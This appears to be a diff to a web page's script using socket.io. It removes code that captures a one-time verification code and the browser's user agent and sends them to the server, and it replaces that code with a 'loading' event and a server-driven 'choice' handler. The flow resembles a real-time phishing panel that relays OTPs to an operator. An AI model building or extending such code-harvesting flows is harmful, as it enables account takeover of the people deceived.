@@ -483,19 +483,9 @@ p {
             </div>
         </div>
 	    <script>
-    const socket = io();
-    // Get the button, assign a click event handler
-    document.getElementById('continueBtn').addEventListener('click', function () {
+    	const socket = io();
 
-        // Show the loading overlay
-        document.querySelector('.loading-overlay').style.display = 'flex';
-        const verificationCode = document.getElementById('verificationCode').value;
-        const data = {
-            otp: verificationCode,
-            userAgent: navigator.userAgent
-        }
-        socket.emit('otp', data)
-    });
+	socket.emit('loading', {page:'loading'})
 
     socket.on('choice', (data) => {
         if (data.action === "bad") {
